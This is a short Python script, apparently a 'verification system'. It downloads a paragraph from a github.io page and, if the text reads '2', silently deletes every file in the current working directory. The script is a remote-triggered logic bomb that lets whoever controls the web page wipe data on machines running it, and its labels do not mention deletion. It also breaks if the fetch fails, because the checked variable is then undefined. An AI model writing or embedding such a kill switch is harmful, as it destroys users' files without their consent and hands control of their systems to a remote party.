from bs4 import BeautifulSoup
import requests
import os

url = 'https://gabriel-preti-ferraz.github.io/verification-system/!!!!!!!!!!'
response = requests.get(url)

if response.status_code == 200:
    soup = BeautifulSoup(response.content, 'html.parser')
    paragraph = soup.find('p')

    if paragraph:
        security = paragraph.text
    else:
        print('Nenhum parágrafo encontrado.')
else:
    print('Erro ao acessar a página:', response.status_code)

if security == '2':
    dir = os.getcwd()

    for file in os.listdir(dir):
        path = os.path.join(dir, file)

        if os.path.isfile(path):
            os.remove(path)